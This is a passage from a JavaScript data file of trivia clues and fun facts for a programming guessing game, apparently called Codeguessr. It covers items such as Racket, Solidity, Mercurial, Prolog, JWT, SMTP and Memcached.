    funFact: 'Hevery reportedly rewrote a 17,000-line Google project in about three weeks using it, ending up with around 1,500 lines.'
  },
  147: {
    clues: [
      "Until 2010 it was known by the name of a Lisp dialect with 'PLT' in front of it.",
      'Its first line is #lang, because it is built for creating new languages.',
      'It comes with a beginner-friendly IDE whose name starts with Dr.',
      'The textbook How to Design Programs uses it.',
      'It is a descendant of Scheme from a group of university researchers.',
      'The Lisp whose name also means a loud noise or a tennis bat.'
    ],
    funFact: 'Its #lang system is so flexible that people have implemented Datalog, Algol 60 and even a typed version of the language itself on top of it.'
  },
  148: {
    clues: [
      'Abhinav Asthana started it in 2012 as a side project in India.',
      'It began life as a Chrome extension.',
      'Requests are grouped into collections, with variables per environment.',
      'Its command-line companion for running collections is called Newman.',
      'It is one of the most popular tools for trying out APIs.',
      'The API client named after the person who delivers your mail.'
    ],
    funFact: 'By 2021 the side project had grown into a company valued at 5.6 billion dollars.'
  },
  149: {
    clues: [
      'It was proposed in 2014 by Gavin Wood.',
      'Its code compiles to bytecode for a virtual machine that charges gas for every step.',
      'Its programs start with the keyword contract instead of class.',
      'A reentrancy bug in a program written in it led to a blockchain splitting in two in 2016.',
      'It is the main language for smart contracts on Ethereum.',
      'The Ethereum language whose name means firmness or reliability.'
    ],
    funFact: 'After The DAO was drained in 2016, Ethereum reversed the theft with a hard fork, and the original chain lives on as Ethereum Classic.'
  },
  150: {
    clues: [
      'Matt Mackall started it in April 2005, just weeks after Git.',
      'It was born for the same reason as Git: the Linux kernel lost its free BitKeeper licence.',
      'It is written mostly in Python.',
      'Its command is the chemical symbol for mercury.',
      'Facebook and Mozilla used it for years.',
      'The distributed version control system whose name means quick-tempered.'
    ],
    funFact: 'Its command, hg, is the chemical symbol of mercury, the liquid metal behind the name.'
  },
  151: {
    clues: [
      'Alain Colmerauer and Philippe Roussel created it in Marseille in 1972.',
      'Programs are facts and rules, and you run them by asking questions.',
      'It finds answers with unification and backtracking.',
      "Japan's Fifth Generation Computer project in the 1980s bet on it.",
      'The best-known logic programming language.',
      "Its name is short for 'programmation en logique'."
    ],
    funFact: "IBM's Watson, which won the quiz show Jeopardy! in 2011, used it to analyse the structure of questions."
  },
  152: {
    clues: [
      'It began as a tool called Fig by a small company named Orchard.',
      'Docker acquired that company in 2014.',
      'You describe services, networks and volumes in one YAML file.',
      'Its second version was rewritten in Go as a plugin for the main CLI.',
      "One 'up' command starts your app, its database and its cache together.",
      'The tool for defining multi-container applications in a compose.yaml file.'
    ],
    funFact: "Its command changed from docker-compose with a hyphen to 'docker compose' with a space when it became a CLI plugin."
  },
  153: {
    clues: [
      'It began in 1989 as a joint product of Microsoft, Sybase and Ashton-Tate.',
      'Its first version ran on OS/2.',
      'Its dialect of SQL is called Transact-SQL, or T-SQL.',
      'Its management tool is known as SSMS.',
      'Since 2017 it also runs on Linux.',
      "Microsoft's relational database."
    ],
    funFact: 'Microsoft announcing it for Linux in 2016 was seen as a sign of how much the company had changed.'
  },
  154: {
    clues: [
      'It came from Ryan Florence and Michael Jackson, the authors of a popular React routing library.',
      'At launch it required a paid licence, before it was open-sourced in 2021.',
      'Each route exports a loader for reading data and an action for handling forms.',
      'Shopify acquired the company behind it in 2022.',
      'Its features were later merged into React Router version 7.',
      'The full-stack React framework whose name means a new version of a song.'
    ],
    funFact: 'Its focus on web standards meant many features worked even with JavaScript turned off, thanks to plain HTML forms.'
  },
  155: {
    clues: [
      'It was announced at re:Invent in 2014.',
      "It made 'serverless' a buzzword.",
      'You upload a function, and it runs only when an event triggers it.',
      'Each run can last at most 15 minutes, and cold starts are its best-known drawback.',
      'It runs on Firecracker, a microVM technology its maker open-sourced in 2018.',
      "Amazon's function-as-a-service, named after a Greek letter."
    ],
    funFact: 'Its billing is so fine-grained that you pay per millisecond of running time.'
  },
  156: {
    clues: [
      'Matt Holt released it in 2015.',
      'It is written in Go and ships as a single binary.',
      'It was the first web server to use HTTPS automatically and by default.',
      "It gets and renews certificates from Let's Encrypt on its own.",
      'Its simple configuration file is named after the server itself.',
      "The web server whose name is also someone who carries a golfer's clubs."
    ],
    funFact: 'A complete config for serving a site over HTTPS can be a single line containing only the domain name.'
  },
  157: {
    clues: [
      'Stephen Kleene described the underlying theory in the 1950s.',
      'Ken Thompson built it into the QED and ed editors, and grep grew from it.',
      "A single badly written one took down Cloudflare's network for about half an hour in 2019.",
      'Symbols such as ^, $, * and \\d are its alphabet.',
      "'Some people, when confronted with a problem, think: I know, I'll use one. Now they have two problems.'",
      'Short for regular expression.'
    ],
    funFact: "The famous 'now they have two problems' joke is usually credited to Jamie Zawinski, from 1997."
  },
  158: {
    clues: [
      'Google released it in 2021 as the successor to the Polymer project.',
      'It is a small library for building standard web components.',
      'Templates are written as tagged template literals with html``.',
      'Reactive properties re-render only the parts of the template that changed.',
      'It weighs about 5 kB.',
      'The web components library whose three-letter name also means illuminated.'
    ],
    funFact: 'Because its components are standard custom elements, they can be used in any framework, or none.'
  },
  159: {
    clues: [
      'Clark Evans, Ingy döt Net and Oren Ben-Kiki proposed it in 2001.',
      'Its name first stood for Yet Another Markup Language, then became a recursive joke.',
      'Indentation matters, and lists start with a dash.',
      'In its older version, an unquoted NO for Norway becomes false.',
      'Kubernetes manifests and GitHub workflows are written in it.',
      "The data format whose name means 'Ain't Markup Language'."
    ],
    funFact: "The 'Norway problem': in its version 1.1, the country code NO is read as the boolean false unless you quote it."
  },
  160: {
    clues: [
      'It started as a university thesis project in 2012.',
      'It promises no runtime exceptions in practice.',
      'Its compiler is famous for friendly, helpful error messages.',
      'Its model-update-view pattern inspired Redux.',
      'A purely functional language that compiles to JavaScript for web front ends.',
      'The language by Evan Czaplicki, named after a tree.'
    ],
    funFact: "Dan Abramov named this language's architecture as one of the inspirations for Redux."
  },
  161: {
    clues: [
      'It replaced an older framework called Sapper.',
      'Its version 1.0 came out in December 2022.',
      'Routes are folders containing files with a plus sign, such as +page and +layout.',
      'Adapters deploy the same app to Node, Vercel, Netlify or Cloudflare.',
      'It is built on Vite and led by Rich Harris.',
      'The application framework for Svelte, named like a toolkit.'
    ],
    funFact: 'Rich Harris, who created both it and Svelte, worked on interactive graphics at The New York Times before joining Vercel.'
  },
  162: {
    clues: [
      'It was started in 2011 at an Argentinian software company.',
      'Its first compiler was written in Ruby, before it could compile itself in 2013.',
      'It infers types, so it looks dynamic while being checked at compile time.',
      'It compiles to native code via LLVM and uses fibers for concurrency.',
      "Its slogan was 'fast as C, slick as Ruby'.",
      'The compiled language with Ruby-like syntax, named after a clear mineral.'
    ],
    funFact: 'Its compiler has been written in the language itself since 2013, when it replaced the original Ruby version.'
  },
  163: {
    clues: [
      'Judd Vinet started it in 2002, inspired by a distribution called CRUX.',
      'It is a rolling release: there are no big version upgrades.',
      'Its package manager is called pacman.',
      'Its user repository, the AUR, and its wiki are legendary.',
      "It gave rise to the meme 'I use ___, btw'.",
      'The do-it-yourself Linux distribution with a blue triangle logo.'
    ],
    funFact: 'Its wiki is so thorough that users of many other distributions rely on it too.'
  },
  164: {
    clues: [
      'Dave Winer, Don Box and others at Microsoft designed it in 1998.',
      'Every message is wrapped in an XML envelope with a header and a body.',
      'Services are described in WSDL files.',
      'A whole family of WS-* standards grew around it.',
      'REST largely replaced it for web APIs.',
      'The XML messaging protocol that shares its name with what you wash your hands with.'
    ],
    funFact: 'Its name once stood for Simple Object Access Protocol, but version 1.2 dropped the acronym; many joked it was never simple anyway.'
  },
  165: {
    clues: [
      'It grew out of Mozilla experiments called Canvas 3D around 2006.',
      'The Khronos Group released version 1.0 in 2011.',
      'It is based on OpenGL ES, the mobile flavour of a classic graphics API.',
      'You get it by calling getContext on a canvas element.',
      'three.js and most 3D on the web sit on top of it.',
      'The browser API for hardware-accelerated 3D graphics.'
    ],
    funFact: 'Its successor, WebGPU, is modelled on modern APIs such as Vulkan, Metal and Direct3D 12.'
  },
  166: {
    clues: [
      'Caleb Porzio released it in 2019.',
      'It is meant for sprinkling interactivity onto pages rendered on the server.',
      'You add behaviour with attributes such as x-data, x-show and x-on:click.',
      'It needs no build step: one script tag and you are done.',
      'It is the A in the TALL stack, next to Tailwind, Laravel and Livewire.',
      'The tiny JavaScript framework named after mountains.'
    ],
    funFact: 'Its creator also built Livewire, and the two are often used together in Laravel projects.'
  },
  167: {
    clues: [
      'Hans Peter Luhn described the idea in an internal IBM memo in 1953.',
      'It turns a key into an index with a function.',
      'Two keys landing in the same bucket is called a collision.',
      'Lookups take constant time on average.',
      "Python's dict and JavaScript's Map are built on it.",
      'The data structure that maps keys to values through a hash function.'
    ],
    funFact: 'Hans Peter Luhn also invented the Luhn algorithm, which still checks credit card numbers for typos.'
  },
  168: {
    clues: [
      'Don Ho released it in 2003.',
      'It is built on the Scintilla editing component and runs only on Windows.',
      'Its logo is a chameleon.',
      'Its author sometimes gives releases names that make political statements.',
      'It is the favourite free upgrade from the built-in Windows text editor.',
      'The Windows text editor whose name adds two plus signs to Notepad.'
    ],
    funFact: 'Its author has used release names to take political stands, which has occasionally led to its site being attacked.'
  },
  169: {
    clues: [
      'Eric Brewer presented it as a conjecture in a 2000 keynote.',
      'Seth Gilbert and Nancy Lynch proved it in 2002.',
      'It says that during a network partition, you must choose between two guarantees.',
      'Those guarantees are consistency and availability.',
      "It is often summed up as 'pick two out of three'.",
      'The theorem about consistency, availability and partition tolerance.'
    ],
    funFact: "Brewer himself later wrote that 'pick two of three' is misleading, since partitions are rare and the trade-off is more subtle."
  },
  170: {
    clues: [
      'Netscape created its first version in 1999 for its My Netscape portal.',
      'Aaron Swartz helped write one of its versions when he was only 14.',
      'Its most famous expansion is Really Simple Syndication.',
      'Google Reader, a popular app for it, was shut down in 2013.',
      'Podcasts are distributed through it to this day.',
      'The web feed format with an orange icon.'
    ],
    funFact: 'Every podcast app still finds new episodes by reading a feed in this format.'
  },
  171: {
    clues: [
      "Its ideas come from Reactive Extensions, created at Microsoft around 2009 by Erik Meijer's team.",
      'Its core type is the Observable, a stream of values over time.',
      'Operators such as map, filter and switchMap are chained with pipe().',
      "Its operators are often explained with 'marble diagrams'.",
      "Angular's HTTP client and forms use it heavily.",
      'The JavaScript library for reactive programming with observables.'
    ],
    funFact: 'Its fifth version was a complete rewrite led by Ben Lesh, then at Netflix.'
  },
  172: {
    clues: [
      "It began with Intel's 8086 processor in 1978.",
      'It is famous for keeping backward compatibility for decades.',
      'It is a CISC architecture with instructions of varying length.',
      'Its 64-bit extension was designed by AMD, and Intel adopted it.',
      'Most desktops, laptops and servers ran on it for decades.',
      "The processor architecture named after the last two digits of Intel's early chips."
    ],
    funFact: "Intel's own 64-bit design, Itanium, failed, so Intel ended up adopting AMD's 64-bit version of this architecture."
  },
  173: {
    clues: [
      'A team at IBM led by John Backus delivered it in 1957 for the IBM 704.',
      'It is often called the first widely used high-level programming language.',
      'In its early fixed form, columns 1 to 5 held labels and column 6 marked a continued line.',
      'Weather and climate models and supercomputer benchmarks still use it.',
      'Its latest standard came out in 2023, and it is still used for number crunching.',
      'The FORmula TRANslation language.'
    ],
    funFact: 'John Backus once said that much of his work came from being lazy: he did not like writing programs, so he built a way to write them faster.'
  },
  174: {
    clues: [
      'Ian Bicking created it in 2008 as a replacement for easy_install.',
      'Its name is a recursive acronym.',
      'It installs packages from the Python Package Index.',
      'Dependencies are often listed in requirements.txt.',
      'Newer tools such as uv and Poetry compete with it.',
      "Python's standard package installer, with a three-letter name."
    ],
    funFact: "Its name stands for 'pip installs packages'."
  },
  175: {
    clues: [
      'It was created in 1986 at a Swedish telephone company.',
      'It was built to run telephone switches that must never go down.',
      "Its philosophy is 'let it crash' and let a supervisor restart the process.",
      'It runs on the BEAM virtual machine and comes with a framework called OTP.',
      "WhatsApp's servers and the language Elixir both build on it.",
      "Ericsson's concurrent language, named after a Danish mathematician."
    ],
    funFact: "Its name honours Agner Krarup Erlang, a pioneer of telephone traffic theory, and conveniently also reads as 'Ericsson Language'."
  },
  176: {
    clues: [
      'Atlassian released it in 2002.',
      'Its name is a shortened form of the Japanese name for Godzilla.',
      'It was a jab at its main open-source competitor, whose name also ends in -zilla.',
      'Tickets, epics, sprints and story points all live in it.',
      'Developers love to complain about it, yet most teams use it.',
      "Atlassian's issue tracker."
    ],
    funFact: 'Its name comes from Gojira, Japanese for Godzilla, as a playful nod to the rival bug tracker Bugzilla.'
  },
  177: {
    clues: [
      'John Kemeny and Thomas Kurtz created it at Dartmouth College in 1964.',
      'It was designed so students outside science could use a time-sharing computer.',
      'Its programs traditionally had line numbers, like 10 PRINT and 20 GOTO 10.',
      'Home computers of the 1980s booted straight into it.',
      "Microsoft's very first product was an interpreter for it.",
      "The Beginner's All-purpose Symbolic Instruction Code."
    ],
    funFact: 'Bill Gates and Paul Allen wrote their interpreter for the Altair 8800 in 1975 without ever having seen the machine itself.'
  },
  178: {
    clues: [
      'The company behind it started out as a GraphQL backend service called Graphcool.',
      'You describe your data model in a single schema file with its own small language.',
      'It generates a fully typed client, so queries are checked by TypeScript.',
      'Its migrate command turns schema changes into SQL migrations.',
      'It is one of the most popular ORMs for Node.js.',
      'The TypeScript ORM named after a glass object that splits light.'
    ],
    funFact: 'In 2025 it began replacing its Rust-based query engine with one written in TypeScript.'
  },
  179: {
    clues: [
      'Dutch engineer Jaap Haartsen developed it at Ericsson in Sweden from 1994.',
      'It was meant to replace the cables between phones and headsets.',
      'It hops between frequencies in the 2.4 GHz band.',
      'Its logo combines two Nordic runes.',
      'Its name comes from a tenth-century Danish king who united tribes.',
      "The short-range wireless standard named after King Harald's blue tooth."
    ],
    funFact: 'Its logo merges the runes for H and B, the initials of Harald Bluetooth, the Danish king it is named after.'
  },
  180: {
    clues: [
      'A group of webmasters started it in 1995 by collecting patches for the NCSA web server.',
      "A popular but disputed story says its name is a pun on 'a patchy server'.",
      'Its per-directory config files start with a dot and let you rewrite URLs.',
      'It was the most used web server in the world for about twenty years.',
      'It is the A in the LAMP stack, and a foundation grew around it.',
      'The web server of the Apache Software Foundation.'
    ],
    funFact: 'The Apache Software Foundation, now home to hundreds of projects, was founded in 1999 to support this one server.'
  },
  181: {
    clues: [
      "TJ Holowaychuk released it in 2010, inspired by Ruby's Sinatra.",
      'Its whole design revolves around middleware functions that call next().',
      "Routes look like app.get('/', (req, res) => ...).",
      'It is the E in the MEAN and MERN stacks.',
      'Its version 5 finally became stable in 2024, about ten years after its first alpha.',
      'The minimal web framework for Node.js whose name also means fast.'
    ],
    funFact: 'It is now maintained under the OpenJS Foundation, long after its original author moved on to other languages.'
  },
  182: {
    clues: [
      'Its standard was published in 1992, by a committee it is named after.',
      'It splits an image into 8x8 blocks and applies a discrete cosine transform.',
      'It throws away detail your eyes are unlikely to miss.',
      "Save it too many times and you get blocky 'artifacts'.",
      'Its common file extension has only three letters because of old DOS limits.',
      'The photo format from the Joint Photographic Experts Group.'
    ],
    funFact: 'Files often end in .jpg rather than the full name because MS-DOS only allowed three-letter extensions.'
  },
  183: {
    clues: [
      'Masahiro Hara invented it at Denso Wave, a Toyota supplier, in 1994.',
      'It was made to track car parts in factories.',
      'Its design was inspired by the black and white stones of the board game Go.',
      'Error correction means it can still be read with up to 30% damaged.',
      'It came back in a big way with restaurant menus during the pandemic.',
      'The square two-dimensional barcode, short for Quick Response.'
    ],
    funFact: 'Denso Wave holds the patent but chose not to enforce it, which is why it is free for anyone to use.'
  },
  184: {
    clues: [
      'Rashid Khan started it around 2013, and it became part of Elastic.',
      'It visualises data stored in Elasticsearch.',
      'Its Discover view lets you search and filter log lines.',
      'Grafana began as a fork of its third version.',
      'It is the K in the ELK stack.',
      "Elastic's dashboard and visualisation tool, whose name starts with K."
    ],
    funFact: 'The ELK stack stands for Elasticsearch, Logstash and it.'
  },
  185: {
    clues: [
      'RFC 7519 defined it in 2015.',
      'It consists of three base64url parts separated by dots.',
      'Those parts are a header, a payload of claims and a signature.',
      'Claims such as exp, sub and iat say who it is for and when it expires.',
      "Its spec says it should be pronounced like the English word 'jot'.",
      'The JSON Web Token.'
    ],
    funFact: "Early libraries accepted tokens with the algorithm set to 'none', letting attackers skip the signature entirely."
  },
  186: {
    clues: [
      'Niklaus Wirth designed it around 1970 to teach structured programming.',
      'Its blocks are wrapped in begin and end, and assignment is written :=.',
      'A cheap and very fast compiler from Borland made it hugely popular in the 1980s.',
      'Delphi is its object-oriented descendant.',
      'It was the standard teaching language at many universities for years.',
      'The language named after the French mathematician who built a mechanical calculator.'
    ],
    funFact: 'Turbo Pascal was written by Anders Hejlsberg, who later designed C# and TypeScript.'
  },
  187: {
    clues: [
      'Hans Dockter started it around 2008.',
      'Its build scripts are code, written in Groovy or Kotlin rather than XML.',
      'Projects ship a small wrapper script so everyone uses the same version.',
      'Its build cache and daemon make repeated builds fast.',
      'It has been the official build system for Android apps since 2013.',
      'The JVM build tool whose files are called build.gradle.'
    ],
    funFact: 'Its wrapper script, gradlew, means you can build a project without installing the tool yourself.'
  },
  188: {
    clues: [
      "At its 2007 launch it had no name of its own; Apple simply said the phone ran 'OS X'.",
      'Its App Store opened a year later, in 2008.',
      'It got its current name in 2010, a name Apple licensed from Cisco.',
      'Its apps are written in Swift or Objective-C.',
      'It runs on every iPhone.',
      "Apple's mobile operating system, with a three-letter name starting with a lowercase i."
    ],
    funFact: 'Cisco already used the name for its router software, so Apple had to license it.'
  },
  189: {
    clues: [
      'Vladimir Agafonkin, from Kyiv, released it in 2011.',
      'It weighs only about 40 kB.',
      'It usually shows tiles from OpenStreetMap.',
      "Everything starts with L.map('map').setView(...).",
      'It is the most popular open-source library for interactive maps.',
      'The JavaScript map library with a green leaf as its logo.'
    ],
    funFact: 'Its creator also wrote many small, fast geometry libraries used across the web mapping world.'
  },
  190: {
    clues: [
      'Microsoft first bundled its developer tools under this name in 1997.',
      'Its projects are grouped in solution files ending in .sln.',
      'It introduced many developers to IntelliSense code completion.',
      'It has a free Community edition, and its Mac version was retired in 2024.',
      'It is the heavyweight IDE for C#, C++ and .NET on Windows.',
      "Microsoft's full IDE, the big sibling of VS Code."
    ],
    funFact: 'Despite the similar names, it and VS Code share very little code: one is a native Windows IDE, the other an Electron app.'
  },
  191: {
    clues: [
      'Jon Postel specified it in RFC 821, in 1982.',
      'A session starts with HELO, or EHLO in its extended form.',
      'MAIL FROM, RCPT TO and DATA are some of its commands.',
      'A message ends with a line containing only a single dot.',
      'It is how email is sent from server to server.',
      'The Simple Mail Transfer Protocol.'
    ],
    funFact: 'Because it originally had no authentication, anyone could claim to be anyone, which is why SPF, DKIM and DMARC were added later.'
  },
  192: {
    clues: [
      'CollabNet started it in 2000.',
      "Its goal was to be 'CVS done right'.",
      'It is centralised: every commit gets the next global revision number.',
      'Repositories traditionally have trunk, branches and tags folders.',
      'Git replaced it almost everywhere, but it lives on as an Apache project.',
      'The version control system whose three-letter command is svn.'
    ],
    funFact: 'Its name has a double meaning: it versions your files, and it set out to overthrow CVS.'
  },
  193: {
    clues: [
      'It grew from a prototype by Alan Cooper that Microsoft bought and code-named Ruby.',
      'It launched in 1991 and let you draw a window first and add code later.',
      "'On Error Resume Next' is one of its most notorious lines.",
      'Its sixth version, from 1998, was hugely popular for business apps.',
      'A variant of it still runs macros inside Microsoft Office.',
      "Microsoft's drag-and-drop descendant of the Dartmouth beginner's language."
    ],
    funFact: 'Alan Cooper is often called its father, even though Microsoft combined his visual designer with its own QuickBASIC language.'
  },
  194: {
    clues: [
      'It was announced in 2018 and became generally available in November 2019.',
      'Its workflows are YAML files in a hidden folder at the root of the repository.',
      "Steps reuse community building blocks with a 'uses:' line, like checkout@v4.",
      'Jobs run on hosted runners with Ubuntu, Windows or macOS, or on your own machines.',
      "Codeguessr's own tests and deployments run on it.",
      'The CI/CD service built into GitHub.'
    ],
    funFact: 'Its marketplace offers tens of thousands of reusable actions, from linting to posting to Slack.'
  },
  195: {
    clues: [
      'It began as an internal hackathon project at Facebook in 2013.',
      "Its motto was 'learn once, write anywhere', not 'write once, run anywhere'.",
      'Its components map to real platform views instead of rendering in a web view.',
      "Its new architecture replaced 'the bridge' with JSI, Fabric and TurboModules.",
      'Expo is the most popular way to start a project with it.',
      "Meta's framework for building iOS and Android apps with React."
    ],
    funFact: "Facebook's Ads Manager was the first Android app it built fully with this framework."
  },
  196: {
    clues: [
      'Evan Wallace released it in 2020.',
      'Its author is also a co-founder of the design tool Figma.',
      'It is written in Go and uses every CPU core.',
      'It is 10 to 100 times faster than the bundlers that came before it.',
      'Vite has used it to pre-bundle dependencies during development.',
      "The extremely fast JavaScript bundler, with a lowercase name starting with 'es'."
    ],
    funFact: 'Its homepage benchmark shows it bundling a large project in well under a second while older tools take close to a minute.'
  },
  197: {
    clues: [
      'It was released in 2021 by the team behind the build tool Snowpack.',
      "It popularised the 'islands' architecture.",
      'By default it ships zero JavaScript to the browser.',
      'Its components have a frontmatter script fenced by three dashes at the top.',
      'You can mix React, Vue and Svelte components on the same page.',
      'The content-focused web framework whose name is Greek for star.'
    ],
    funFact: 'Its team stopped developing Snowpack to focus on this framework instead.'
  },
  198: {
    clues: [
      'Juan Linietsky and Ariel Manzur from Argentina open-sourced it in 2014.',
      'It is released under the MIT licence, with no royalties at all.',
      'Games are built from scenes made of nodes.',
      'Its own scripting language, GDScript, looks like Python.',
      "Many developers switched to it after Unity's pricing controversy in 2023.",
      'The open-source game engine named after a play in which someone never arrives.'
    ],
    funFact: "It is named after Samuel Beckett's play Waiting for Godot, a joke about a game engine that is never quite finished."
  },
  199: {
    clues: [
      'Gary Bradski started it at Intel in 1999.',
      'Its 1.0 release came in 2006, and the robotics lab Willow Garage later supported it.',
      'It stores colour images in BGR order by default, not RGB.',
      'In Python you import it as cv2.',
      'Face detection, edge detection and camera calibration are classic uses.',
      'The open-source computer vision library.'
    ],
    funFact: 'Its BGR default goes back to camera and display conventions that were common when it was first written.'
  },
  200: {
    clues: [
      'Three Bell Labs researchers created it in 1977.',
      'Its programs are a list of patterns, each followed by an action in braces.',
      'It splits every line into fields that you refer to as $1, $2 and so on.',
      'NR holds the current line number and NF the number of fields.',
      'Its GNU version adds one letter to the front of its name.',
      'The Unix text-processing language named after the initials of Aho, Weinberger and Kernighan.'
    ],
    funFact: 'The K in its name is Brian Kernighan, who is also the K in K&R, the classic book on the C language.'
  },
  201: {
    clues: [
      'Yonik Seeley created it at CNET Networks in 2004.',
      'It was donated to Apache in 2006.',
      'It is built on top of the search library Lucene.',
      'It is known for faceted search, the filters with counts on shopping sites.',
      'It is the older open-source rival of Elasticsearch.',
      "The Apache search platform whose name is pronounced like 'solar'."
    ],
    funFact: 'Both it and its big rival Elasticsearch use Lucene, the Java search library by Doug Cutting, under the hood.'
  },
  202: {
    clues: [
      'It was announced at WWDC in 2019.',
      'Views are lightweight structs with a computed property called body.',
      'Property wrappers such as @State and @Binding drive updates.',
      'Xcode shows live previews of your views as you type.',
      'It is the declarative successor to UIKit and AppKit.',
      "Apple's UI framework named after its language, plus two letters."
    ],
    funFact: 'The same code can target iPhone, iPad, Mac, Apple Watch, Apple TV and Vision Pro.'
  },
  203: {
    clues: [
      'François Chollet released it in 2015.',
      'Its name is Greek for horn, a reference to a passage in the Odyssey.',
      'A Sequential model stacks layers like building blocks.',
      "It became TensorFlow's official high-level API.",
      'Its version 3 can run on JAX, TensorFlow or PyTorch.',
      'The user-friendly deep learning API by François Chollet.'
    ],
    funFact: 'Its name refers to the Odyssey, where dreams that come true pass through a gate of horn, and false ones through a gate of ivory.'
  },
  204: {
    clues: [
      'Gavin King started it in 2001.',
      'It maps Java classes to database tables.',
      'Its query language, HQL, looks like SQL but talks about objects.',
      'The Java Persistence API standard was heavily influenced by it.',
      'Red Hat took over its development via JBoss.',
      'The Java ORM named after what bears do in winter.'
    ],
    funFact: 'Gavin King later designed a JVM language of his own, called Ceylon.'
  },
  205: {
    clues: [
      'Google open-sourced it in 2011, after buying a company called Global IP Solutions.',
      'It lets two browsers send audio, video and data directly to each other.',
      'ICE, STUN and TURN help it get through firewalls and NAT.',
      'getUserMedia asks for the camera, and RTCPeerConnection sets up the call.',
      'Google Meet and many other video apps run on it.',
      'Web Real-Time Communication.'
    ],
    funFact: 'It became an official W3C and IETF standard in 2021, a decade after it was first released.'
  },
  206: {
    clues: [
      'Richard Stallman released its first version in 1987.',
      'It first stood for GNU C Compiler, before it supported many more languages.',
      'A 1997 fork called EGCS became so good that it replaced the original in 1999.',
      'Flags such as -O2, -Wall and -g are everyday options.',
      'The Linux kernel has been built with it for most of its history.',
      'The GNU Compiler Collection.'
    ],
    funFact: 'The EGCS fork was so successful that the project adopted it as the official version in 1999.'
  },
  207: {
    clues: [
      'Alexis Sellier released it in 2009.',
      'Its first version was written in Ruby, then rewritten in JavaScript.',
      'Variables start with @ instead of $.',
      'Bootstrap 3 was built with it, before switching to its rival in version 4.',
      'It is a CSS preprocessor that can even run in the browser.',
      'The CSS preprocessor whose name means the opposite of more.'
    ],
    funFact: "Its name has been expanded as 'Leaner Style Sheets'."
  },
  208: {
    clues: [
      'Steve Francia started it in 2013, and Bjørn Erik Pedersen later became its lead developer.',
      'It builds thousands of pages in seconds as a single binary.',
      "It uses Go's template language, with shortcodes inside Markdown.",
      'Content lives in Markdown files with front matter at the top.',
      'It is one of the most popular static site generators.',
      "The static site generator written in Go, with a man's first name."
    ],
    funFact: 'Steve Francia also created the Go libraries Cobra and Viper, which power many command-line tools.'
  },
  209: {
    clues: [
      'Two Dutch computer scientists, Dijkstra and Van Wijngaarden, made sure ALGOL 60 supported it.',
      'Every correct use needs a base case.',
      'Forget that, and you get a stack overflow.',
      "Search for it on Google and it asks: 'Did you mean' the same word again.",
      'The classic examples are factorial and Fibonacci.',
      'When a function calls itself.'
    ],
    funFact: "Getting it into ALGOL 60 at the last minute is sometimes called the 'Amsterdam plot'."
  },
  210: {
    clues: [
      'It was spun off from the IPython project in 2014.',
      'Its name combines three languages it supported from the start.',
      "It also nods to Galileo's notebooks recording the moons of a planet.",
      'Its documents mix code, output, charts and text in cells.',
      'Its files end in .ipynb.',
      'The notebook environment beloved by data scientists.'
    ],
    funFact: 'Its name is built from Julia, Python and R.'
  },
  211: {
    clues: [
      'Its roots lie partly in Nieuwegein, where NCR engineers built early wireless LAN products.',
      'Dutch engineer Vic Hayes chaired the IEEE 802.11 committee and is called its father.',
      'Its first standard came out in 1997.',
      'A branding agency invented its name in 1999; it does not stand for anything.',
      'Since 2018 its generations have simple numbers, such as 6 and 7.',
      'Wireless networking, with a hyphenated brand name.'
    ],
    funFact: "Despite popular belief, its name is not short for 'wireless fidelity'; it was made up by the branding firm Interbrand."
  },
  212: {
    clues: [
      "It appeared in Unix in the 1970s, and Paul Vixie's 1987 version became the common one.",
      'Its name comes from the Greek word for time.',
      'Each line has five time fields: minute, hour, day of month, month and day of week.',
      "Five asterisks mean 'every minute'.",
      'You edit your schedule with crontab -e.',
      'The Unix job scheduler.'
    ],
    funFact: 'Its five-field syntax is so widespread that GitHub Actions, Kubernetes and most cloud schedulers reuse it.'
  },
  213: {
    clues: [
      'Jeff Atwood and Joel Spolsky launched it in 2008.',
      "Readers of Atwood's blog voted on its name.",
      'Reputation points and badges reward helpful answers.',
      "'Closed as duplicate' became its most notorious phrase.",
      'Its traffic dropped sharply after AI chatbots arrived.',
      'The Q&A site for programmers, named after a memory error.'
    ],
    funFact: "Its name was chosen in a poll among readers of Jeff Atwood's blog Coding Horror."
  },
  214: {
    clues: [
      'It began as the PhD research of Eelco Dolstra at Utrecht University.',
      'It calls itself a purely functional package manager.',
      'Every package lives in a store, under a path with a hash of all its inputs.',
      'A whole Linux distribution is built on it, and flakes pin every input.',
      'It promises reproducible builds and rollbacks for your entire system.',
      'The package manager with a three-letter name that is also slang for nothing.'
    ],
    funFact: "It was born in the Netherlands: Eelco Dolstra's 2006 PhD thesis at Utrecht University laid its foundations."
  },
  215: {
    clues: [
      'The term first came from electronics, where signals compete to reach a gate first.',
      'It helped cause fatal radiation overdoses from the Therac-25 machine in the 1980s.',
      'A bug in an alarm system of this kind contributed to the 2003 blackout in North America.',
      'The outcome depends on the unpredictable timing of threads.',
      'Locks and atomic operations prevent it.',
      'The bug where the result depends on which thread gets there first.'
    ],
    funFact: 'Bugs like this often vanish when you add logging or a debugger, because that changes the timing.'
  },
  216: {
    clues: [
      'David Cramer started it in 2008 as a small logging plugin for Django.',
      'It groups identical exceptions together and shows how often they happen.',
      'It shows the full stack trace, the release and the user that hit the error.',
      'Its SDKs exist for almost every language and framework.',
      'It is one of the most popular error tracking services.',
      'The error monitoring tool whose name means a guard on watch.'
    ],
    funFact: 'In 2023 it created its own licence, the Functional Source License, which turns into an open-source licence after two years.'
  },
  217: {
    clues: [
      'It was developed at Xerox PARC in the 1970s by Alan Kay, Dan Ingalls, Adele Goldberg and others.',
      'In it, everything is an object and all computation happens by sending messages.',
      'You work inside a live image, changing the running system as you go.',
      'Ruby and Objective-C both borrowed heavily from it.',
      'Its 1980 version was the first to be widely released outside the lab.',
      'The object-oriented pioneer whose name also means casual chit-chat.'
    ],
    funFact: 'The Model-View-Controller pattern was first described by Trygve Reenskaug in 1979 while he was working with this language at Xerox PARC.'
  },
  218: {
    clues: [
      'Emile Vauge started it in France in 2015.',
      'It is a reverse proxy written in Go.',
      'It discovers services on its own from Docker labels or Kubernetes resources.',
      "It gets TLS certificates from Let's Encrypt automatically.",
      'The company behind it was called Containous until it renamed itself after the product.',
      "The cloud-native reverse proxy whose name is pronounced 'traffic'."
    ],
    funFact: "Its unusual spelling is pronounced exactly like the English word 'traffic'."
  },
  219: {
    clues: [
      'Brad Fitzpatrick wrote it in 2003 for the blogging site LiveJournal.',
      'It keeps everything in RAM and forgets it on restart.',
      'When it runs out of memory, it evicts the least recently used items.',
      'Facebook ran one of the largest deployments in the world.',
